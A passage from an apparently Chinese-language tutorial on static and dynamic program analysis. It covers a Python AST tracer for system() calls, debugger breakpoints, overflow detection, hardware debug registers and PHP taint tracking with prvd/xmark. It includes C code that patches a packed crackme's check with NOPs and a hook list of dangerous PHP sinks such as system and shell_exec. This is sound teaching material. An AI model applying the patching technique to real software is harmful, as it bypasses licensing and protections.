        'declare' : resolver_function_parameter(code_buffer_resolver) ,
    } ,
}


def get_function_parameters(ast_node) :
    parameters_list = []

    for subnode_index in ast_node.subnode :
        if subnode_index[1].type == 'parallel' :
            parameters_list += get_function_parameters(subnode_index[1])
        elif subnode_index[0] == 'parameters' :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })
        elif subnode_index[0].startswith('exp') :
            parameters_list.append({
                'type' : subnode_index[1].type ,
                'value' : subnode_index[1].value ,
            })

    return parameters_list

def recursive_find_call(ast_node,find_function_name) :
    find_result = []

    for subnode_index in ast_node.subnode :
        if subnode_index[1] == None :
            continue

        if 'function_call' == subnode_index[1].type :
            if find_function_name == '*' or find_function_name == subnode_index[1].value :
                parameters_list = get_function_parameters(subnode_index[1])

                find_result.append((subnode_index,parameters_list))

        find_result += recursive_find_call(subnode_index[1],find_function_name)

    return find_result

def print_search_result(call_list) :
    for call_index in call_list :
        ast_node_info = call_index[0]
        parameters_info = call_index[1]

        print 'Call Function Name :',ast_node_info[1].value
        print '  Function Argument :',parameters_info

def resolve_strategy(user_search_strategy) :
    user_search_strategy = user_search_strategy.split('\n')
    check_strategy = []

    for user_search_strategy_index in user_search_strategy :
        strategy_record = user_search_strategy_index.strip()

        if not len(strategy_record) :
            continue

        search_function_name = strategy_record.split('(')[0].strip()
        search_parameter_string = strategy_record.split('(')[1].strip()
        search_parameter_string = search_parameter_string.split(')')[0].strip()
        search_parameter_list = []

        if len(search_parameter_string) :
            if not -1 == search_parameter_string.find(',') :
                search_parameter_string = search_parameter_string.split(',')
                parameter_index = -1

                for search_parameter_index in search_parameter_string :
                    check_parameter = search_parameter_index.strip()
                    parameter_index += 1

                    if not check_parameter == '*' :
                        continue

                    search_parameter_list.append(parameter_index)
            else :
                check_parameter = search_parameter_string.strip()

                if check_parameter == '*' :
                    search_parameter_list.append(0)

        check_strategy.append((search_function_name,search_parameter_list))

    return check_strategy

def search_call_by_strategy(search_strategy,code_object) :
    search_strategy = resolve_strategy(search_strategy)
    search_record = {}

    for search_strategy_index in search_strategy :  #  Search Call by Strategy
        find_function_name = search_strategy_index[0]
        search_check_parameter_list = search_strategy_index[1]
        find_function_call = recursive_find_call(code_object,find_function_name)
        search_record_list = []

        print_search_result(find_function_call)

        for call_index in find_function_call :  #  Find Match Strategy Call
            ast_node_info = call_index[0]
            parameters_list = call_index[1]

            if search_check_parameter_list :
                check_parameter_list = []

                for search_check_parameter_index in search_check_parameter_list :  #  Filter Call Argument
                    if len(parameters_list) &lt;= search_check_parameter_index :
                        continue

                    target_search_parameter = parameters_list[search_check_parameter_index]

                    if not target_search_parameter['type'] in ['variable','address_of'] :  #  Check this Argument is a Variant ..
                        continue

                    check_parameter_list.append(target_search_parameter)

                if check_parameter_list :
                    search_record_list.append((ast_node_info,check_parameter_list))
            else :
                search_record_list.append((ast_node_info,[]))

        if search_record_list :
            search_record[find_function_name] = search_record_list

    return search_record


def xref_variant(trance_record,bingo_parameter_name,function_declare) :
    xref_record = []

    for trance_record_index in trance_record[ :: -1 ] :
        if trance_record_index[1].type in ['get_element','assign'] :
            if bingo_parameter_name in trance_record_index[1].value :
                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })
        elif trance_record_index[1].type == 'function_call' :
            function_parameters = get_function_parameters(trance_record_index[1])

            for function_parameter_index in function_parameters :
                if not bingo_parameter_name in function_parameter_index['value'] :
                    continue

                xref_record.append({
                    'type' : trance_record_index[1].type ,
                    'value' : trance_record_index[1].value ,
                    'node' : trance_record_index
                })

    for function_parameter_index in function_declare['parameters'] :
        function_parameter_name = function_parameter_index['name']

        if not bingo_parameter_name == function_parameter_name :
            continue

        xref_record.append({
            'type' : 'parameter' ,
            'value' : function_parameter_name ,
            'node' : None
        })

    return xref_record

def trance_record_by_ast(start_node,target_node,bingo_parameters,function_declare,trance_record) :
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            xref_record_list = []

            for bingo_parameter_index in bingo_parameters :
                xref_record_list.append(xref_variant(trance_record + code_record,bingo_parameter_index['value'],function_declare))

            return (True,xref_record_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_record_by_ast(node_object_index[1],target_node,bingo_parameters,function_declare,trance_record + code_record)

        if is_search :
            xref_record_list = sub_data

            return (True,xref_record_list)

        sub_code_record = sub_data
        code_record += sub_code_record

    return (False,code_record)

def get_condition(ast_node) :
    for index in ast_node.subnode :
        if 'condition' == index[0] :
            return index[1].value

    return False

def trance_control_flow_by_ast(start_node,target_node,trance_record) :
    code_record = []

    for node_object_index in start_node.subnode :
        if node_object_index == target_node :
            all_trance_record = trance_record + code_record
            control_flow_list = []

            for trance_record_index in all_trance_record :
                if trance_record_index[1].type == 'if' :
                    control_flow_list.append(get_condition(trance_record_index[1]))

            return (True,control_flow_list)

        code_record.append(node_object_index)

        is_search,sub_data = trance_control_flow_by_ast(node_object_index[1],target_node,trance_record + code_record)

        if is_search :
            control_flow_record_list = sub_data

            return (True,control_flow_record_list)

    return (False,code_record)

def xref_function(code_stream,search_function_name) :
    search_xref_data = {}

    for function_name in code_stream.keys() :
        function_code = code_stream[function_name]['code']
        search_result = recursive_find_call(function_code,search_function_name)

        if not search_result :
            continue

        xref_record = xref_function(code_stream,function_name)
        search_xref_data[function_name] = {
            'xref' : xref_record ,
            'reference' : search_result ,
        }

    return search_xref_data

def deep_trance(reference_point_list,xref_reference_function_name,current_function_name) :
    trance_record = {}
    #print 'deep_trance  :  ',current_function_name,'-&gt;',xref_reference_function_name

    for reference_point in reference_point_list :
        code_object = code_stream[xref_reference_function_name]['code']
        code_function_declare = code_stream[xref_reference_function_name]['declare']
        reference_point_ast_node = reference_point[0]
        reference_variant_list = reference_point[1]
        control_flow_list = trance_control_flow_by_ast(code_object,reference_point_ast_node,[])[1]
        data_flow_list = trance_record_by_ast(code_object,reference_point_ast_node,reference_variant_list,code_function_declare,[])[1]
        xref_function_list = xref_function(code_stream,xref_reference_function_name)
        xref_record_list = []

        for xref_function_name in xref_function_list.keys() :
            xref_function_object = xref_function_list[xref_function_name]

            xref_record_list.append(deep_trance(xref_function_object['reference'],xref_function_name,xref_reference_function_name))

        trance_record[xref_reference_function_name] = {
            'data_flow' : data_flow_list ,
            'control_flow' : control_flow_list ,
            'xref' : xref_record_list ,
        }

    return trance_record


search_strategy = 'system(*)'
search_record_list = []

for function_name in code_stream.keys() :
    search_record = search_call_by_strategy(search_strategy,code_stream[function_name]['code'])

    #print 'Search Record :',search_record

    if not search_record :
        continue

    search_record_list.append({
        'function_name' : function_name ,
        'record' : search_record ,
    })

for search_record_index in search_record_list :
    xref_reference_function_name = search_record_index['function_name']
    reference_record_list = search_record_index['record']

    for reference_function_name in reference_record_list.keys() :
        reference_point_list = reference_record_list[reference_function_name]

        print 'Xref-Search for',reference_function_name,'deep_trance() Result :'
        print deep_trance(reference_point_list,xref_reference_function_name,reference_function_name)

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="9-动态程序分析原理"><a class="header" href="#9-动态程序分析原理">9. 动态程序分析原理</a></h1>
<ul>
<li><a href="7.dynamic-analysis.html#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
<li><a href="7.dynamic-analysis.html#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">动态代码分析基本原理</a></li>
<li><a href="7.dynamic-analysis.html#%E5%86%85%E5%AD%98%E7%9B%91%E6%8E%A7">内存监控</a>
<ul>
<li><a href="7.dynamic-analysis.html#%E8%BD%AF%E4%BB%B6%E7%9B%91%E6%8E%A7">软件监控</a></li>
<li><a href="7.dynamic-analysis.html#%E7%A1%AC%E4%BB%B6%E7%9B%91%E6%8E%A7">硬件监控</a></li>
</ul>
</li>
<li><a href="7.dynamic-analysis.html#%E6%B1%A1%E7%82%B9%E8%BF%BD%E8%B8%AA">污点追踪</a></li>
<li><a href="7.dynamic-analysis.html#%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C">符号执行</a></li>
<li><a href="7.dynamic-analysis.html#%E7%A8%8B%E5%BA%8F%E6%8F%92%E6%A1%A9%E4%B8%8E%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87">程序插桩与代码覆盖率</a></li>
</ul>
<h2 id="必备工具-6"><a class="header" href="#必备工具-6">必备工具</a></h2>
<p>Python ,Triton (https://github.com/JonathanSalwan/Triton)</p>
<h2 id="动态代码分析基本原理"><a class="header" href="#动态代码分析基本原理">动态代码分析基本原理</a></h2>
<p>动态代码执行主要是使用调试模式或者模拟执行的模式跟踪执行程序.动态分析主要分为四部分:内存监控,污点追踪,符号执行,程序插桩.</p>
<h2 id="内存监控"><a class="header" href="#内存监控">内存监控</a></h2>
<p>在动态调试代码的过程中,我们往往会需要对某一块特定的内存,字符串或对代码执行过程进行跟踪分析.内存监控分为软件监控和硬件监控,下面将一一描述.</p>
<h3 id="软件监控"><a class="header" href="#软件监控">软件监控</a></h3>
<p>软件监控的方式分为两种,一种是在代码段中插入<code>Int 3</code>指令,代码执行到这段指令后就会触发调试中断;另一种是对内存区域进行读写权限限制,对于某个在堆(HeapAlloc())的权限是不可读写的,但是通过malloc() 申请的内存是可以被读写的,那么一旦这块内存产生越界读写就可以触发程序异常.</p>
<p>我们以UPX 加壳举个例子,Link : https://github.com/lcatro/my-blog/blob/master/2015/%E5%88%A9%E7%94%A8Debug%20API%20%E5%AE%9E%E7%8E%B0%E5%86%85%E5%AD%98%E6%B3%A8%E5%86%8C%E6%9C%BA.md .假定已经通过逆向知道0x4307CC 是UPX 解压缩之后的程序入口点,那么我们在编写调试器的时候可以在0x4307CC 处设置调试断点.</p>
<pre><code class="language-c">
#include &lt;malloc.h&gt;
#include &lt;memory.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;winnt.h&gt;

#define BREAK_ADDRESS_SHELL_JMP 0x4307CC
#define BREAK_ADDRESS_JE        0x401188
#define BREAK_FLAG 0xCC

const char* set_break(HANDLE process,LPVOID set_address,unsigned int set_length=1) {  //  设置断点
    if (!set_length) return NULL;

    char* break_flag_buffer=(char*)malloc(set_length);
    memset(break_flag_buffer,BREAK_FLAG,set_length);
    DWORD write_length=0;

    char* old_code_buffer=(char*)malloc(set_length);
    DWORD read_length=0;
    ReadProcessMemory(process,set_address,(LPVOID)old_code_buffer,set_length,&amp;read_length);  //  原理是通过写0xCC 来实现软中断

    WriteProcessMemory(process,set_address,(LPVOID)break_flag_buffer,set_length,&amp;write_length);
    free(break_flag_buffer);

    return old_code_buffer;
}

bool remove_break(HANDLE process,LPVOID remove_address,const char* rewrite_code_buffer,unsigned int remove_length) {  //  删除断点
    DWORD write_length=0;

    return (bool)WriteProcessMemory(process,remove_address,(LPVOID)rewrite_code_buffer,remove_length,&amp;write_length);
}

HANDLE open_process(DWORD processid) {
    return OpenProcess(PROCESS_ALL_ACCESS,FALSE,processid);
}

int main(int argc,char** argv) {
    STARTUPINFO process_startupinfo={0};
    PROCESS_INFORMATION process_info={0};
    CreateProcess(NULL,&quot;crackme_shell.exe&quot;,NULL,NULL,FALSE,DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,NULL,NULL,&amp;process_startupinfo,&amp;process_info);  //  启动调试程序
    printf(&quot;CreateProcessId=%X\n&quot;,process_info.dwProcessId);

    HANDLE process=open_process(process_info.dwProcessId);

    set_break(process,(void*)BREAK_ADDRESS_SHELL_JMP,1);  //  在UPX 解压结束的长跳转中设置中断

    DEBUG_EVENT debug_event={0};
    debug_event.dwProcessId=process_info.dwProcessId;

    while (WaitForDebugEvent(&amp;debug_event,INFINITE)) {  //  等待系统发来中断事件
        switch (debug_event.dwDebugEventCode) {
            case EXCEPTION_DEBUG_EVENT: {
                switch (debug_event.u.Exception.ExceptionRecord.ExceptionCode) {
                    case EXCEPTION_BREAKPOINT: {
                        CONTEXT regesit={0};
                        regesit.ContextFlags=CONTEXT_FULL;
                        GetThreadContext(process_info.hThread,&amp;regesit);  //  主要是读取EIP
                        printf(&quot;EIP=%X\n&quot;,regesit.Eip);

                        switch (--regesit.Eip) {
                            case BREAK_ADDRESS_SHELL_JMP: {
                                SetThreadContext(process_info.hThread,&amp;regesit);
                                char jmp_code[1]={0xE9};
                                remove_break(process,(void*)BREAK_ADDRESS_SHELL_JMP,jmp_code,sizeof(jmp_code));  //  消除断点替换0xE9 (JMP 的指令码)

                                char nop_code[2]={0x90,0x90};
                                remove_break(process,(void*)BREAK_ADDRESS_JE,nop_code,sizeof(nop_code));  //  往JE 写两个NOP
                            }
                        }
                    }
                }
            }
        }
        if (EXIT_PROCESS_DEBUG_EVENT==debug_event.dwDebugEventCode)  //  程序退出
            break;
        ContinueDebugEvent(process_info.dwProcessId,process_info.dwThreadId,DBG_CONTINUE);

    }
    printf(&quot;OK!\n&quot;);

    return 0;
}

</code></pre>
<p>调试程序运行到0x4307CC 执行<code>INT 3</code>指令中断,然后把原来的中断二进制数据0xCC (INT 3 指令的Opcode)换回0xE9 (JMP 指令的Opcode),然后让被调试的程序执行至结束.执行结果如下:</p>
<p><img src="pic7/pic1.png" alt="" /></p>
<p>那么对内存区域进行读写权限限制具体是有哪些表现的.先用JAVA 举个例子(在https://tool.lu/coderunner/ 上执行):</p>
<pre><code class="language-java">
class Untitled {
	public static void main(String[] args) {
		String data = new String(&quot;Hello&quot;);

		data.charAt(0);
		data.charAt(6);

		System.out.println(data);
	}
}

</code></pre>
<p>程序输出如下:</p>
<pre><code class="language-txt">
Exception in thread &quot;main&quot; java.lang.StringIndexOutOfBoundsException: String index out of range: 6
	at java.base/java.lang.StringLatin1.charAt(StringLatin1.java:47)
	at java.base/java.lang.String.charAt(String.java:693)
	at Untitled.main(Untitled.java:6)

</code></pre>
<p>JAVA 在执行阶段,会根据对字符串的操作索引位置和字符串长度来检测是否存在上下标越界的问题,但是C/C++ 底层的汇编却不会对buffer 的操作索引进行检查.对于这个问题的解决方案,我们就使用<code>VirtualProtect()</code> 函数进行内存权限设置,一旦越界触发读写内存异常,下面是一段示例代码:</p>
<pre><code class="language-c">
#include &lt;malloc.h&gt;
#include &lt;memory.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;


#define TEST_FLAG &quot;AAAAAAAAAAAAAAAAAAAAAA&quot;


int main(int argc,char** argv) {
    char* buffer = (char*)malloc(0x10);

    printf(&quot;heap_address = 0x%X\n&quot;,buffer);

    memcpy(buffer,TEST_FLAG,strlen(TEST_FLAG));

    printf(&quot;Buffer Address = 0x%X\n&quot;,buffer);
    printf(&quot;Buffer = %s\n&quot;,buffer);

    return 0;
}

</code></pre>
<p>这段代码会触发越界写问题,但是程序没有因为越界写的问题导致程序崩溃.</p>
<p><img src="pic7/pic20.png" alt="" /></p>
<p>然后我们构造两个buffer ,一个是外层是不允许访问的,然后在这个buffer 内部再分配一个可以读写的buffer .布局如下:</p>
<pre><code class="language-txt">
 outside-buffer               outside-buffer
 _______^___________________________^______
|  No-Access  |  Read-Write  |  No-Access  |
               -------v------
                inside-buffer

</code></pre>
<p>测试代码如下:</p>
<pre><code class="language-c++">

#include &lt;memory.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#include &lt;windows.h&gt;


#define TEST_FLAG &quot;AAAAAAAAAAAAAAAAAAAAAA&quot;


int main(int argc,char** argv) {
    LPVOID heap_region = VirtualAlloc(NULL,0x1000,MEM_COMMIT,PAGE_NOACCESS);

    printf(&quot;heap_region = 0x%X\n&quot;,heap_region);

    LPVOID address = (LPVOID)((DWORD)heap_region + 0x100);

    printf(&quot;heap_address = 0x%X\n&quot;,address);

    VirtualProtect((LPVOID)address,10,PAGE_READWRITE,0);

    char* buffer = (char*)address;

    memcpy(buffer,TEST_FLAG,strlen(TEST_FLAG));

    printf(&quot;Buffer Address = 0x%X\n&quot;,buffer);
    printf(&quot;Buffer = %s\n&quot;,buffer);

    return 0;
}

</code></pre>
<p>检测效果如下:</p>
<p><img src="pic7/pic21.png" alt="" /></p>
<h3 id="硬件监控"><a class="header" href="#硬件监控">硬件监控</a></h3>
<p>前面提到,用INT 3 指令可以触发调试中断,但这是软中断.在硬件层上还有个更底层的调试中断寄存器:DR 寄存器.我们以OD 为例子来介绍,启动OD 并调试程序,点击菜单&quot;调试&quot;-&gt;&quot;硬件断点&quot;.</p>
<p><img src="pic7/pic9.png" alt="" /></p>
<p>OD 会弹出硬件断点窗口.</p>
<p><img src="pic7/pic10.png" alt="" /></p>
<p>我们回到OD 的汇编窗口,任意点击一条汇编指令,点击右键&quot;断点&quot;-&gt;&quot;硬件执行&quot;.</p>
<p><img src="pic7/pic11.png" alt="" /></p>
<p>然后再回来到硬件断点窗口,就可以看到前面设置的记录了.</p>
<p><img src="pic7/pic12.png" alt="" /></p>
<p>来到寄存器窗口右键点击空白区域,可以看到查看调试寄存器.</p>
<p><img src="pic7/pic13.png" alt="" /></p>
<p>就能看到调试寄存器的内容输出.</p>
<p><img src="pic7/pic14.png" alt="" /></p>
<p>DR 调试器包含DR0-DR3 ,DR6-DR7 .其中DR0-DR3 保存的是中断地址;DR6 是命中中断时记录地址是DR0-DR3 中的哪个编号;DR7 是调试控制位.在DR6 中保存的数据,如果命中了DR0 寄存器,那么DR6 寄存器的第15 位将会设置为1 .</p>
<p><img src="pic7/pic15.png" alt="" /></p>
<p><img src="pic7/pic16.png" alt="" /></p>
<p>然后F9 执行,命中中断,DR6 寄存器数值产生了改变.</p>
<p><img src="pic7/pic17.png" alt="" /></p>
<p><img src="pic7/pic18.png" alt="" /></p>
<p>DR7 寄存器各位的字段如下:</p>
<p><img src="pic7/pic19.png" alt="" /></p>
<p>关于DR7 寄存器详细字段请自行查阅手册,使用DR 寄存器的方法和设置调试方法差别不大(一般应用DB 寄存器比较多的是在反反调试和反病毒中,此时一些常见软件调试手段会失效,比如代码自检函数头Hook 点,自动清除INT 3 指令,大量抛出异常干扰调试(这需要根据调试代码来识别,软件调试一般触发的事件有EXCEPTION_BREAKPOINT ,EXCEPTION_FLT_DIVIDE_BY_ZERO 等.但DB 寄存器会抛出STATUS_SINGLE_STEP ,这是硬件异常警告),这就需要依靠硬件寄存器来帮助调试),此处不再细说.</p>
<h2 id="污点追踪"><a class="header" href="#污点追踪">污点追踪</a></h2>
<p>污点追踪的主要原理是,在输入处构造一些带有标签的数据,然后在敏感函数和位置设置Hook ,观察带有标签的输入数据是否能够流到这个位置来判断漏洞是否存在.我们以prvd (https://github.com/fate0/prvd ,PHP 污点追踪工具)为例子介绍污点追踪.prvd 包含了生成污点数据,追踪数据流,复现漏洞.该项目的作者还写了一个PHP Hook 框架xmark (https://github.com/fate0/xmark ),这两者一起结合使用.整体结构如下:</p>
<p><img src="pic7/pic22.png" alt="" /></p>
<p>先提示一下,xmark 框架分两点:1.重定向Opcode 的执行回调函数,达到Hook Opcode 的执行;2.重命名原函数名,然后再自定义同名函数达到Hook .先来看看prvd 的PHP.ini 文件,配置数据如下:</p>
<pre><code class="language-txt">
auto_prepend_file = &quot;/data/prvd/src/Entry.php&quot;   #  导入prvd 的Entry.php ,这是为了给输入打污染标签.

[xmark]  #  导入XMARK hook 框架
xmark.enable = 1
xmark.rename_enable = 0
xmark.rename_classes = &quot;  #  重命名类名称
    SQLite3:prvd_SQLite3,
    mysqli:prvd_mysqli,
    PDO:prvd_PDO,
&quot;
xmark.rename_functions = &quot;  #  重命名函数列表
    base64_decode:prvd_base64_decode,
    basename:prvd_basename,
    dirname:prvd_dirname,
    explode:prvd_explode,
    gzuncompress:prvd_gzuncompress,
    hex2bin:prvd_hex2bin,
    html_entity_decode:prvd_html_entity_decode,
    htmlspecialchars_decode:prvd_htmlspecialchars_decode,
    implode:prvd_implode,
    join:prvd_join,
    json_decode:prvd_json_decode,
    ltrim:prvd_ltrim,
    pathinfo:prvd_pathinfo,
    rawurldecode:prvd_rawurldecode,
    rawurlencode:prvd_rawurlencode,
    rtrim:prvd_rtrim,
    sprintf:prvd_sprintf,
    str_ireplace:prvd_str_ireplace,
    str_pad:prvd_str_pad,
    str_replace:prvd_str_replace,
    strstr:prvd_strstr,
    strtolower:prvd_strtolower,
    strtoupper:prvd_strtoupper,
    substr:prvd_substr,
    trim:prvd_trim,
    urldecode:prvd_urldecode,
    urlencode:prvd_urlencode,
    vsprintf:prvd_vsprintf,
    exec:prvd_exec,
    passthru:prvd_passthru,
    popen:prvd_popen,
    proc_open:prvd_proc_open,
    shell_exec:prvd_shell_exec,
    system:prvd_system,
    unserialize:prvd_unserialize,
    copy:prvd_copy,
    dir:prvd_dir,
    file:prvd_file,
    file_get_contents:prvd_file_get_contents,
    file_put_contents:prvd_file_put_contents,
    fopen:prvd_fopen,
    glob:prvd_glob,
    highlight_file:prvd_highlight_file,
    link:prvd_link,
    move_uploaded_file:prvd_move_uploaded_file,
    opendir:prvd_opendir,
    readfile:prvd_readfile,
    rename:prvd_rename,
    rmdir:prvd_rmdir,
    scandir:prvd_scandir,
    show_source:prvd_show_source,
    unlink:prvd_unlink,
    mysqli_init:prvd_mysqli_init,
    mysqli_multi_query:prvd_mysqli_multi_query,
    mysqli_query:prvd_mysqli_query,
    mysqli_prepare:prvd_mysqli_prepare,
    mysqli_real_query:prvd_mysqli_real_query,
    pg_prepare:prvd_pg_prepare,
    pg_query:prvd_pg_query,
    pg_query_params:prvd_pg_query_params,
    pg_send_prepare:prvd_pg_send_prepare,
    pg_send_query:prvd_pg_send_query,
    pg_send_query_params:prvd_pg_send_query_params,
    curl_exec:prvd_curl_exec,
    fsockopen:prvd_fsockopen,
    get_headers:prvd_get_headers,
    print_r:prvd_print_r,
    printf:prvd_printf,
    vprintf:prvd_vprintf
&quot;

</code></pre>
<p>xmark 的初始化函数主要是读取配置文件内的数据并初始化内部变量.</p>
<pre><code class="language-c">
PHP_INI_BEGIN()
  STD_PHP_INI_BOOLEAN(&quot;xmark.enable&quot;, &quot;0&quot;, PHP_INI_SYSTEM, OnUpdateBool, enable, zend_xmark_globals, xmark_globals)
  STD_PHP_INI_BOOLEAN(&quot;xmark.enable_rename&quot;, &quot;0&quot;, PHP_INI_SYSTEM, OnUpdateBool, enable_rename, zend_xmark_globals, xmark_globals)
  STD_PHP_INI_ENTRY(&quot;xmark.rename_functions&quot;, &quot;&quot;, PHP_INI_SYSTEM, OnUpdateString, rename_functions, zend_xmark_globals, xmark_globals)  //  从配置文件中的rename_functions 字段读取数据到rename_functions 变量
  STD_PHP_INI_ENTRY(&quot;xmark.rename_classes&quot;, &quot;&quot;, PHP_INI_SYSTEM, OnUpdateString, rename_classes, zend_xmark_globals, xmark_globals)
PHP_INI_END()

// 省略无关代码

PHP_MINIT_FUNCTION(xmark)
{
    // ...

    REGISTER_LONG_CONSTANT(&quot;XMARK_ECHO&quot;, ZEND_ECHO, CONST_CS|CONST_PERSISTENT);  //  设置常量值..
    REGISTER_LONG_CONSTANT(&quot;XMARK_EXIT&quot;, ZEND_EXIT, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_INIT_METHOD_CALL&quot;, ZEND_INIT_METHOD_CALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_INIT_USER_CALL&quot;, ZEND_INIT_USER_CALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_INIT_DYNAMIC_CALL&quot;, ZEND_INIT_DYNAMIC_CALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_INCLUDE_OR_EVAL&quot;, ZEND_INCLUDE_OR_EVAL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_CONCAT&quot;, ZEND_CONCAT, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_FAST_CONCAT&quot;, ZEND_FAST_CONCAT, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_ASSIGN_CONCAT&quot;, ZEND_ASSIGN_CONCAT, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_ROPE_END&quot;, ZEND_ROPE_END, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_DO_FCALL&quot;, ZEND_DO_FCALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_DO_ICALL&quot;, ZEND_DO_ICALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_DO_UCALL&quot;, ZEND_DO_UCALL, CONST_CS|CONST_PERSISTENT);
    REGISTER_LONG_CONSTANT(&quot;XMARK_DO_FCALL_BY_NAME&quot;, ZEND_DO_FCALL_BY_NAME, CONST_CS|CONST_PERSISTENT);

    php_xmark_register_opcode_handlers();  //  设置Hook Opcode 回调函数
    rename_from_ini_value(CG(function_table), XMARK_G(rename_functions), XMARK_IS_FUNCTION);  //  function_table 和class_table 是PHP 内核的表,rename_from_ini_value 就是根据ini 文件的规则来重命名它们.
    rename_from_ini_value(CG(class_table), XMARK_G(rename_classes), XMARK_IS_CLASS);

    return SUCCESS;
}

static void php_xmark_register_opcode_handlers()
{
    zend_set_user_opcode_handler(ZEND_ECHO, php_xmark_op1_handler);  //  设置Opcode 回调函数..
    zend_set_user_opcode_handler(ZEND_EXIT, php_xmark_op1_handler);
    zend_set_user_opcode_handler(ZEND_INIT_METHOD_CALL, php_xmark_op2_handler);
    zend_set_user_opcode_handler(ZEND_INIT_USER_CALL, php_xmark_op2_handler);
    zend_set_user_opcode_handler(ZEND_INIT_DYNAMIC_CALL, php_xmark_op2_handler);
    zend_set_user_opcode_handler(ZEND_INCLUDE_OR_EVAL, php_xmark_op1_handler);
    zend_set_user_opcode_handler(ZEND_CONCAT, php_xmark_concat_handler);
    zend_set_user_opcode_handler(ZEND_FAST_CONCAT, php_xmark_concat_handler);
    zend_set_user_opcode_handler(ZEND_ASSIGN_CONCAT, php_xmark_assign_concat_handler);
    zend_set_user_opcode_handler(ZEND_ROPE_END, php_xmark_rope_end_handler);
    zend_set_user_opcode_handler(ZEND_DO_FCALL, php_xmark_fcall_handler);
    zend_set_user_opcode_handler(ZEND_DO_ICALL, php_xmark_fcall_handler);
    zend_set_user_opcode_handler(ZEND_DO_UCALL, php_xmark_fcall_handler);
    zend_set_user_opcode_handler(ZEND_DO_FCALL_BY_NAME, php_xmark_fcall_handler);

    if (XMARK_G(enable_rename))
        zend_set_user_opcode_handler(ZEND_INIT_FCALL, php_xmark_init_fcall);
}

//  这个函数由PHP 内核声明的.https://github.com/php/php-src/blob/852485d8ecd784153e41e565a0a87abf99cf4e0d/Zend/zend_execute.c#L4294

ZEND_API int zend_set_user_opcode_handler(zend_uchar opcode, user_opcode_handler_t handler)  //  设置Opcode 回调函数
{
  if (opcode != ZEND_USER_OPCODE) {
    if (handler == NULL) {
      /* restore the original handler */
      zend_user_opcodes[opcode] = opcode;
    } else {
      zend_user_opcodes[opcode] = ZEND_USER_OPCODE;
    }
    zend_user_opcode_handlers[opcode] = handler;
    return SUCCESS;
  }
  return FAILURE;
}

</code></pre>
<p>定位到<code>php_xmark_op1_handler()</code> 的代码,这个函数是处理对Opcode 的第一个操作参数进行处理的回调函数.实现细节如下:</p>
<pre><code class="language-c">
static int php_xmark_op1_handler(zend_execute_data *execute_data) {
    //  zend_execute_data 结构表示当前执行上下文环境,保存了代码执行位置和局部变量等数据.
    const zend_op *opline = execute_data-&gt;opline;  //  获取当前执行的Opcode
    zend_free_op free_op1;
    zval *op1;
    zval *z_fname;
    zval call_func_ret;

    if (XMARK_G(in_callback)) {  //  Opcode 调用过程中可能会触发多次回调函数被调用,这个标志就是识别是否多次重复被调用了.
        return ZEND_USER_OPCODE_DISPATCH;
    }

    z_fname = zend_hash_index_find(&amp;XMARK_G(callbacks), opline-&gt;opcode);  //  用户自定义Hook Opcode 回调
    if (!z_fname) {
        return ZEND_USER_OPCODE_DISPATCH;
    }

    XMARK_G(in_callback) = 1;  //  设置重复调用标记

    op1 = php_xmark_get_zval_ptr(execute_data, opline-&gt;op1_type, opline-&gt;op1, &amp;free_op1, BP_VAR_R, 0);  //  获取第一个Opcode 操作数

    if (op1) {
        if (SUCCESS != call_user_function(EG(function_table), NULL, z_fname, &amp;call_func_ret, 1, op1)) {
            zend_error(E_WARNING, &quot;call function error&quot;);
        }

        zval_ptr_dtor_nogc(&amp;call_func_ret);
    }

    XMARK_G(in_callback) = 0;
    return ZEND_USER_OPCODE_DISPATCH;
}

</code></pre>
<p>关于xmark 就介绍到此,然后我们再跟踪prvd 的Entry.php 文件,</p>
<pre><code class="language-php">
&lt;?php

if (!extension_loaded('xmark')) {
    trigger_error(&quot;xmark not installed&quot;, E_USER_WARNING);
    return;
}

// 省略代码

require(PRVD_ABSPATH.&quot;Config.php&quot;);  // 引入Config.php
require(PRVD_ABSPATH.&quot;Utils.php&quot;);   // 引入Utils.php

// mark 输入变量
prvd_xmark($_GET, true);  // 给输入点打标签
prvd_xmark($_POST, true);
prvd_xmark($_COOKIE, true);
prvd_xmark($_FILES, true);
prvd_xmark($_REQUEST, true);

foreach ($_SERVER as $key =&gt; &amp;$value) {
    if (stripos($key, 'HTTP_') === 0) {
        prvd_xmark($value);
    }
}

// 1. 加载 sink
prvd_load_file(PRVD_ABSPATH.&quot;sink/*/*.php&quot;);  // 这些目录下的都是规则命名文件.
// 2. 加载 filter
